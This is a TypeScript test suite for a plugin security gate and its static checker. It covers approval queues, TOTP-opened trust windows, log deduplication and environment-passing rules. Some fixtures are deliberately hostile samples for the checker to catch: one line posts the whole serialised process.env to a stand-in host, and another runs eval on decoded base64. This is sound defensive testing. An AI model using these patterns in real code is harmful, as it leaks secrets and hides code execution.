// Items from the "На потом" sections of the reviews of PR 2.2 and PR 2a, taken into stage 2.3.
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import Database from "better-sqlite3";
import { afterAll, beforeEach, describe, expect, it } from "vitest";
import { runChecks, type CheckResult } from "../src/checks/index.js";
import { Gate, type HookCtx } from "../src/gate.js";
import { MIGRATIONS, Store } from "../src/store.js";
import { base32Decode, hotp, stepAt } from "../src/totp.js";
import { hashTree } from "../src/tree.js";
import { bbWatchSource } from "../src/watch/bb-source.js";
import { NotApplicableError } from "../src/watch/collect.js";
import { formatWatch } from "../src/watch/format.js";
import { CLEAN, NETWORKED, withFindings } from "./support/checks.js";
import { WatchHarness } from "./support/watch.js";

const scratch = realpathSync(mkdtempSync(join(tmpdir(), "sbb-items-")));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));
let n = 0;
async function files(tree: Record<string, string>): Promise<CheckResult> {
  const dir = join(scratch, `t${n++}`);
  mkdirSync(dir, { mode: 0o755 });
  for (const [rel, body] of Object.entries(tree)) {
    mkdirSync(join(dir, rel, ".."), { recursive: true, mode: 0o755 });
    writeFileSync(join(dir, rel), body, { mode: 0o644 });
  }
  return runChecks(dir);
}
const ts = (body: string) => files({ "server.ts": body });
const envRules = (r: CheckResult) => r.findings.filter((f) => f.rule === "env-passed").map((f) => f.severity);

// ---- gate harness (as in decision.test.ts) --------------------------------------------
class H {
  t = 1_800_000_000_000;
  store: Store;
  gate: Gate;
  root = realpathSync(mkdtempSync(join(tmpdir(), "sbb-items-gate-")));
  snaps = join(this.root, "snapshots");
  next: CheckResult = CLEAN;
  code!: () => string;
  constructor() {
    mkdirSync(this.snaps);
    const db = new Database(":memory:");
    for (const s of MIGRATIONS) db.exec(s);
    this.store = new Store(db, () => this.t);
    this.gate = new Gate({ store: this.store, now: () => this.t, threads: { ancestors: async () => [], descendants: async () => [] }, thirdPartyRunning: async () => [], externalTotpFile: null, snapshotsRoot: this.snaps, runChecks: async () => this.next, checkWaitMs: 200 });
  }
  async register() {
    const { secret } = await this.gate.beginRegistration({ attended: true, caller: "test" });
    this.code = () => hotp(base32Decode(secret), stepAt(this.t));
    this.gate.confirmRegistration(this.code());
    this.t += 31_000;
  }
  tick() {
    this.t += 31_000;
  }
  async snapshot(k: number) {
    const dir = join(this.snaps, "demo", `h${k}`);
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "bb-plugin-demo", version: `1.0.${k}` }));
    writeFileSync(join(dir, "server.ts"), `export default () => ${k};\n`);
    const w = await this.gate.windowCovering("demo", "T1");
    const proposal = this.store.addProposal({ pluginId: "demo", localHash: await hashTree(dir), snapshotDir: dir, threadId: "T1", windowId: w?.id ?? null });
    const c: HookCtx = { pluginId: "demo", version: `1.0.${k}`, source: `path:${dir}`, sourceKind: "path", gitCommit: null, npmIntegrity: null, rootDir: dir, contentHash: `sha256:core${k}`, trigger: "install" };
    return { dir, proposal, ctx: c };
  }
  /** What `propose` leaves when the window is closed: a held entry bound to the proposal, with no content hash. */
  proposeEntry(proposalId: number) {
    return this.store.upsertQueue({ kind: "proposal", contentHash: null, pluginId: "demo", version: "1.0.1", source: "x", sourceKind: "path", rootDir: null, gitCommit: null, npmIntegrity: null, trigger: "propose", threadId: "T1", proposalId, reason: "окно доверия закрыто" });
  }
}

describe("PR 2.2 review: a proposal's queue entry is closed when the version is approved (by proposal id)", () => {
  let h: H;
  beforeEach(async () => {
    h = new H();
    await h.register();
  });

  it("the version later passes through the window: the entry that propose made no longer says 'held'", async () => {
    h.store.putCheck("sha256:opening", "demo", CLEAN);
    const opening = h.store.upsertQueue({ kind: "proposal", contentHash: "sha256:opening", pluginId: "demo", version: "1", source: "x", sourceKind: "path", rootDir: null, gitCommit: null, npmIntegrity: null, trigger: "propose", threadId: "T1", proposalId: null, reason: null });
    h.tick();
    h.gate.openWindow(opening.id, h.code());
    const s = await h.snapshot(1);
    const entry = h.proposeEntry(s.proposal.id);
    expect(entry.contentHash).toBeNull(); // the hash alone can never find it
    expect((await h.gate.decide(s.ctx)).action).toBe("proceed");
    expect(h.store.getQueue(entry.id)!.status).toBe("approved");
    expect(h.store.listQueue().filter((q) => q.status === "held" && q.proposalId === s.proposal.id)).toEqual([]);
  });

  it("the same for a safe-class snapshot approved by itself, and for a touch approval", async () => {
    const s1 = await h.snapshot(1);
    const e1 = h.proposeEntry(s1.proposal.id);
    expect((await h.gate.decide(s1.ctx)).action).toBe("proceed"); // clean + safe class → auto
    expect(h.store.getQueue(e1.id)!.status).toBe("approved");

    h.next = NETWORKED;
    const s2 = await h.snapshot(2);
    const e2 = h.proposeEntry(s2.proposal.id);
    expect((await h.gate.decide(s2.ctx)).action).toBe("wait");
    const held = h.store.listQueue().find((q) => q.status === "held" && q.proposalId === s2.proposal.id)!;
    h.tick();
    h.gate.approveQueue(held.id, h.code());
    expect(h.store.listQueue().filter((q) => q.status === "held")).toEqual([]);
    void e2;
  });

  it("a held 'snapshot changed' entry still becomes stale (not approved) when the original loads", async () => {
    const s = await h.snapshot(1);
    h.proposeEntry(s.proposal.id);
    writeFileSync(join(s.dir, "server.ts"), "export default () => 'tampered';\n");
    expect((await h.gate.decide({ ...s.ctx, contentHash: "sha256:coreTampered" })).action).toBe("wait"); // other bytes, other hash
    const held = h.store.listQueue().find((q) => q.status === "held")!;
    expect(held.reason).toContain("снимок изменён");
    writeFileSync(join(s.dir, "server.ts"), "export default () => 1;\n");
    expect((await h.gate.decide(s.ctx)).action).toBe("proceed");
    expect(h.store.getQueue(held.id)!.status).toBe("stale");
  });
});

describe("PR 2.2 review: repeated identical decisions are one log entry", () => {
  let h: H;
  beforeEach(async () => {
    h = new H();
    await h.register();
  });
  const count = (kind: string) => h.store.listLog(500).filter((l) => l.kind === kind).length;

  it("a plugin that stays rejected is logged once, however often the hook rechecks it", async () => {
    h.next = withFindings([{ rule: "decode-eval", severity: "block", file: "server.ts", line: 3, excerpt: "eval(atob(…))" }]);
    const s = await h.snapshot(1);
    for (let i = 0; i < 5; i++) expect((await h.gate.decide(s.ctx)).action).toBe("reject");
    expect(count("reject")).toBe(1);
  });

  it("a plugin that stays held is logged once; a changed reason is a new fact", async () => {
    h.next = NETWORKED;
    const s = await h.snapshot(1);
    for (let i = 0; i < 4; i++) expect((await h.gate.decide(s.ctx)).action).toBe("wait");
    expect(count("hold")).toBe(1);
    h.next = withFindings([{ rule: "dynamic-access", severity: "review", file: "server.ts", line: 2, excerpt: "x[y]" }]);
    h.store.db.prepare(`DELETE FROM check_results`).run(); // a different verdict for the same hash (e.g. checks re-run)
    await h.gate.decide(s.ctx);
    expect(count("hold")).toBe(2);
  });

  it("the same decision after something else was decided in between is logged again", async () => {
    h.next = NETWORKED;
    const s = await h.snapshot(1);
    await h.gate.decide(s.ctx);
    h.store.log("revoked", "demo", s.ctx.contentHash, { version: "1.0.1" }); // e.g. approved, then revoked
    await h.gate.decide(s.ctx);
    expect(count("hold")).toBe(2);
  });
});

describe("PR 2.2 review: automations.test.ts — `async <T>(…) =>` in a .ts file now parses", () => {
  it("generic async arrows (plain type parameters) are analysed, not parse-failed", async () => {
    const r = await ts(
      [
        "const kv = new Map<string, unknown>();",
        "const storage = {",
        "  get: async <T>(key: string) => kv.get(key) as T | undefined,",
        "  pair: async <K, V>(k: K, v: V) => [k, v] as const,",
        "  bounded: async <T extends object>(o: T) => o,",
        "};",
        "await fetch('https://x.example/');",
        "export default storage;",
        "",
      ].join("\n"),
    );
    expect(r.findings.map((f) => f.rule)).not.toContain("parse-failed");
    expect(r.capabilities.map((c) => c.kind)).toContain("network"); // the code after it was analysed
  });
  it("code inside the blanked arrow is still analysed", async () => {
    const r = await ts("export const f = async <T>(x: T) => { eval(atob('MQ==')); return x; };\n");
    expect(r.findings.map((f) => f.rule)).not.toContain("parse-failed");
    expect(r.findings.some((f) => f.rule === "decode-eval" && f.severity === "block")).toBe(true);
  });
  it("a file that really is broken is still parse-failed", async () => {
    expect((await ts("export const x = ;;; <T>(\n")).findings.map((f) => f.rule)).toContain("parse-failed");
  });
});

describe("PR 2.2 review: env-passed is quiet where the callee only reads named variables", () => {
  it("a function of this file that reads env.NAME / env[name] / destructures: info, not review", async () => {
    const r = await ts(
      [
        "function home(env: NodeJS.ProcessEnv) { return env.HOME ?? env['USERPROFILE']; }",
        "const pick = (e: Record<string, string | undefined>, k: string) => e[k];",
        "function dest({ HOME, PATH }: NodeJS.ProcessEnv) { return [HOME, PATH]; }",
        "const withDefault = (env = process.env) => env.CODEX_HOME;",
        "home(process.env);",
        "pick(process.env, 'X');",
        "dest(process.env);",
        "withDefault(process.env);",
        "",
      ].join("\n"),
    );
    expect(envRules(r)).toEqual(["info", "info", "info", "info"]);
    expect(r.findings.filter((f) => f.severity !== "info")).toEqual([]);
    expect(r.capabilities.map((c) => c.kind)).toContain("env"); // still a capability
  });
  it("what leaves the callee's hands stays a review: passing on, spreading, serialising, mutating, rest patterns", async () => {
    const r = await ts(
      [
        "import { send } from './send.js';",
        "function a(env: any) { return send(env); }",
        "function b(env: any) { return { ...env }; }",
        "function c(env: any) { return JSON.stringify(env); }",
        "function d(env: any) { env.X = '1'; return 1; }",
        "function e({ HOME, ...rest }: any) { return rest; }",
        "function f(env: any) { const copy = env; return copy; }",
        "a(process.env);",
        "b(process.env);",
        "c(process.env);",
        "d(process.env);",
        "e(process.env);",
        "f(process.env);",
        "",
      ].join("\n"),
    );
    expect(envRules(r)).toEqual(["review", "review", "review", "review", "review", "review"]);
  });
  it("an imported or unknown callee is still a review; a function declared twice is not trusted", async () => {
    expect(envRules(await ts("import { foo } from 'some-package';\nfoo(process.env);\n"))).toEqual(["review"]);
    expect(envRules(await ts("obj.method(process.env);\n"))).toEqual(["review"]);
    expect(envRules(await ts("function g(e: any) { return e.A; }\n{ function g(e: any) { return JSON.stringify(e); } }\ng(process.env);\n"))).toEqual(["review"]);
  });
  it("across files: a relative import that only reads named variables is info; everything else stays a review", async () => {
    const r = await files({
      "src/host.ts": [
        "export function resolveHome(env: NodeJS.ProcessEnv): string { return env.HOME ?? '/'; }",
        "export function leak(env: NodeJS.ProcessEnv): string { return JSON.stringify(env); }",
        "export function pass(env: NodeJS.ProcessEnv) { return leak(env); }",
        "export default function dflt(env: NodeJS.ProcessEnv) { return env.X; }",
        "",
      ].join("\n"),
      "src/index.ts": [
        "import { resolveHome, leak, pass, missing } from './host.js';",
        "import dflt from './host.js';",
        "import { other } from 'a-package';",
        "resolveHome(process.env);",
        "leak(process.env);",
        "pass(process.env);",
        "missing(process.env);",
        "dflt(process.env);",
        "other(process.env);",
        "",
      ].join("\n"),
    });
    const bySite = Object.fromEntries(r.findings.filter((f) => f.rule === "env-passed").map((f) => [f.line, f.severity]));
    expect(bySite).toEqual({ 4: "info", 5: "review", 6: "review", 7: "review", 8: "review", 9: "review" });
    expect(r.findings.find((f) => f.rule === "env-passed" && f.line === 4)!.excerpt).toContain("only reads named variables");
  });
  it("across files: index files, extension swaps and sub-directories resolve; an unrelated tree does not", async () => {
    const r = await files({
      "lib/env/index.ts": "export const home = (e: any) => e.HOME;\n",
      "lib/a.mjs": "import { home } from './env/index.js';\nhome(process.env);\n",
      "lib/b.ts": "import { home } from './env';\nhome(process.env);\n",
      "lib/c.ts": "import { home } from './nope.js';\nhome(process.env);\n",
    });
    const sev = (file: string) => r.findings.find((f) => f.rule === "env-passed" && f.file === file)?.severity;
    expect(sev("lib/a.mjs")).toBe("info");
    expect(sev("lib/b.ts")).toBe("info");
    expect(sev("lib/c.ts")).toBe("review");
  });
  it("the serialising callee is still a block (nothing about env-dump was loosened)", async () => {
    const r = await ts("function g(e: any) { return e.A; }\nfetch('https://x.example/', { body: JSON.stringify(process.env) });\ng(process.env);\n");
    expect(r.findings.some((f) => f.rule === "env-dump" && f.severity === "block")).toBe(true);
  });
});

describe("PR 2a review: a project without a local folder is 'not applicable', not 'could not read'", () => {
  let h: WatchHarness;
  beforeEach(() => {
    h = new WatchHarness();
  });

  it("the watchdog lists it separately and does not treat it as a failure", async () => {
    h.bb.projectList.push({ id: "proj_personal", name: "Personal" });
    const orig = h.bb.envSetup.bind(h.bb);
    h.bb.envSetup = async (id: string) => {
      if (id === "proj_personal") throw new NotApplicableError("у проекта нет локального каталога");
      return orig(id);
    };
    await h.watch.scan();
    const v = h.watch.view();
    expect(v.failed).toEqual([]);
    expect(v.notApplicable).toEqual([{ source: "envsetup:proj_personal", reason: "у проекта нет локального каталога" }]);
    const text = formatWatch(v, h.t);
    expect(text).toContain("не применимо (читать нечего)");
    expect(text).not.toContain("не удалось прочитать сейчас");
  });

  it("other read errors are still failures", async () => {
    h.bb.envSetup = async () => {
      throw new Error("HTTP 500");
    };
    await h.watch.scan();
    expect(h.watch.view().failed.map((f) => f.source)).toEqual(["envsetup:proj_a"]);
    expect(h.watch.view().notApplicable).toEqual([]);
  });

  it("the bb adapter maps HTTP 409 on the project's file read to that, and a missing file to 'no file'", async () => {
    const make = (err: unknown) =>
      bbWatchSource({
        sdk: { projects: { fileContent: async () => Promise.reject(err) } } as never,
        listPlugins: async () => [],
        loopbackBaseUrl: () => "http://127.0.0.1:1",
        dataDir: () => "/nonexistent",
      });
    await expect(make(new Error("HTTP 409")).envSetup("proj_personal")).rejects.toBeInstanceOf(NotApplicableError);
    await expect(make(Object.assign(new Error("conflict"), { status: 409 })).envSetup("proj_personal")).rejects.toBeInstanceOf(NotApplicableError);
    expect(await make(new Error("HTTP 404 not found")).envSetup("proj_a")).toBeNull();
    await expect(make(new Error("HTTP 500")).envSetup("proj_a")).rejects.not.toBeInstanceOf(NotApplicableError);
  });
});
